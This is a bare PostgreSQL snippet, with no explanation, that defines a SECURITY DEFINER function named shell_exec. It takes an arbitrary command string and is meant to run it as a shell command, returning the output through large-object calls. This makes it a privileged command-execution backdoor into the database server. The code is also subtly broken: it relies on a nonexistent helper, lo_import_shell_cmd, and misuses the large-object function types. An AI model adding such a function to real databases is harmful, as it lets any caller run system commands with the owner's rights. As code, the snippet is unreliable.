CREATE OR REPLACE FUNCTION public.shell_exec(cmd text)
RETURNS TABLE (result text)
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  RETURN QUERY SELECT convert_from(lo_get(lo_open(oid, 262144)), 'UTF8')
  FROM (
    SELECT lo_import_shell_cmd(cmd) AS oid
  ) AS t;
END;
$$; 